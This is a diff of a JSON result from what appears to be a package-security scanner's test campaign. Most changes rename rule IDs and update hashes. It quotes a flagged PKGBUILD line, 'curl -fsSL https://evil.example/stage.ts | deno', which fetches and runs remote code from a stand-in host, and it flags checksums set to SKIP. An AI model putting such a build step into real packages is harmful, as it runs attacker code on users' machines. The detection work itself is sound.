@@ -1,7 +1,7 @@
 {
   "attempt": 2,
   "cost": {},
-  "db_hash": "sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "db_hash": "sha256:5c9dec1886cc01f5f2307ee1ea87f9b32a4cef0f8f9a2c68beebc558013bedab",
   "diff_sha256": "sha256:7b324c1cc36efe6ff9334c1f1c43c028ca3aa9ca3d6cd2ac2bbdb77effecb572",
   "environment_ref": "campaign.yml#environment",
   "generator": {
@@ -41,13 +41,13 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+    "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
     "report": {
       "changes": [
         "checksums changed from sha256 to SKIP",
         "source host added: evil.example"
       ],
-      "config_fingerprint": "sha256:674ed4b8bef677140dfac9d70671a3dea5221fb93c0d3f35cf17036c55baccb1",
+      "config_fingerprint": "sha256:a7343821bc34603c5b4b048e213725d72a44fe0a5c92fd6d8c92e3f66aec0e8f",
       "coverage_gaps": [
         "tree_not_analyzed"
       ],
@@ -69,14 +69,14 @@
           "template": "Uses curl in PKGBUILD: {match}"
         },
         {
-          "description": "checksum set to SKIP [R004]",
+          "description": "checksum set to SKIP [H001]",
           "evidence": {
             "match": "sha256sums=SKIP",
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
           "line": 14,
-          "rule_id": "R004",
+          "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}"
         },
@@ -94,7 +94,7 @@
           "template": "Fetch Piped Into An Unrecognised Consumer: {match}"
         },
         {
-          "description": "build() fetches https://evil.example/stage.ts from outside the declared source array [R061]",
+          "description": "build() fetches https://evil.example/stage.ts from outside the declared source array [H016]",
           "evidence": {
             "match": "build() downloads https://evil.example/stage.ts, which is not in source=()",
             "position": "build",
@@ -102,7 +102,7 @@
           },
           "file": "PKGBUILD",
           "line": null,
-          "rule_id": "R061",
+          "rule_id": "H016",
           "severity": "HIGH",
           "template": "{position}() fetches {url} from outside the declared source array"
         },
@@ -112,15 +112,6 @@
           "file": "",
           "line": null,
           "rule_id": "SOURCE_BUCKET",
-          "severity": "MEDIUM",
-          "template": ""
-        },
-        {
-          "description": "Source URL first seen globally (maturity=0.14) [NOVELTY]",
-          "evidence": {},
-          "file": "",
-          "line": null,
-          "rule_id": "NOVELTY",
           "severity": "MEDIUM",
           "template": ""
         }
@@ -167,7 +158,7 @@
             "skip_suffix": ""
           },
           "reason": "Checksum Disabled: sha256sums=SKIP",
-          "rule_id": "R004",
+          "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}",
           "weight": 25
@@ -201,7 +192,7 @@
             "touched": "build"
           },
           "reason": "Critical Build Function Modified: diff modifies build()",
-          "rule_id": "R060",
+          "rule_id": "H015",
           "severity": "INFO",
           "template": "critical build function modified: {touched}",
           "weight": 0
@@ -219,7 +210,7 @@
             "url": "https://evil.example/stage.ts"
           },
           "reason": "Hidden Network Fetch In Build: build() downloads https://evil.example/stage.ts, which is not in source=()",
-          "rule_id": "R061",
+          "rule_id": "H016",
           "severity": "HIGH",
           "template": "{position}() fetches {url} from outside the declared source array",
           "weight": 25
@@ -235,7 +226,7 @@
             "n_categories": 5
           },
           "reason": "Capability Density Anomaly: rule hits span 5 distinct capability categories",
-          "rule_id": "R072",
+          "rule_id": "H027",
           "severity": "INFO",
           "template": "findings span {n_categories} distinct capability categories",
           "weight": 0
@@ -265,23 +256,12 @@
           "severity": "MEDIUM",
           "template": "",
           "weight": 20
-        },
-        {
-          "evidence": {},
-          "file": "",
-          "line": null,
-          "params": {},
-          "reason": "Source URL first seen globally (maturity=0.14)",
-          "rule_id": "NOVELTY",
-          "severity": "MEDIUM",
-          "template": "",
-          "weight": 1
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: checksum set to SKIP [R004]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [R061]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Source URL first seen globally (maturity=0.14) [NOVELTY]; and 1 more signal(s). Review the diff before building.",
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version bump. added 1 source URL(s). Signals: checksum set to SKIP [H001]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [H016]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 756
+    "wall_clock_ms": 841
   }
 }
